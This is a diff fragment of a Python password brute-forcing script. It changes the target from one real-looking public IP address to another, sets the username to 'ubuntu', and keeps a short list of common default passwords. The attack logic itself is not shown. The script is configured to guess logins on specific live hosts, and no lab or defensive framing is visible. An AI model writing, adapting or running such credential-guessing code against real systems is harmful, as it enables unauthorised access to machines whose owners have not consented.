@@ -36,8 +36,8 @@ def brute_force(ip, username, password_list):
             break
 
 if __name__ == "__main__":
-    target_ip = "3.18.23.239"  # Replace with the target IP
-    target_username = "testec2-user"  # Replace with the target username
+    target_ip = "18.220.59.145"  # Replace with the target IP
+    target_username = "ubuntu"  # Replace with the target username
     passwords = ["123456", "password", "admin", "root", "toor"]  # Replace with your password list
 
     brute_force(target_ip, target_username, passwords)
